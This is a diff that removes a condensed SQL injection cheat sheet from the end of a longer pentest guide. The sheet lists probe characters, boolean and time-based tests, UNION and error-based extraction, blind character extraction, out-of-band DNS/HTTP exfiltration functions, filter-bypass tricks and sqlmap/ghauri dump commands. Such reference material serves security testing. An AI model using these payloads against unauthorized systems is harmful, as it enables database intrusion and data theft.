@@ -2329,22 +2329,3 @@ ghauri -u "URL" --batch --banner --current-db --dbs --tables --columns --dump
 
 ---
 
-## 🎯 FINAL QUICK CHEAT (Print This!)
-
-```
-🔍 DISCOVER: Try ' " ` ) -- in all inputs
-✅ CONFIRM: TRUE='1'='1' / FALSE='1'='2' / TIME=SLEEP(5)
-🗄️ IDENTIFY: @@version / version() / banner / sqlite_version()
-📊 ENUMERATE: information_schema / sysdatabases / all_tables
-🔗 UNION: ORDER BY N → UNION SELECT NULL×N → Replace NULL with data
-⚠️ ERROR: EXTRACTVALUE / CONVERT(int,subquery) / CAST(subquery AS int)
-🙈 BLIND: ASCII(SUBSTR(query,pos,1))=X → Binary search chars
-⏱️ TIME: IF(cond,SLEEP(5),0) → Measure response delay
-🌐 OOB: LOAD_FILE / xp_dirtree / UTL_HTTP → DNS/HTTP exfil
-🛡️ BYPASS: /**/ for space, BETWEEN for =, CONCAT for strings
-🤖 TOOLS: sqlmap -u URL --batch --dbs | ghauri -u URL --batch
-📋 MANUAL: Repeater + Intruder + Collaborator + Logger++
-```
-
----
-
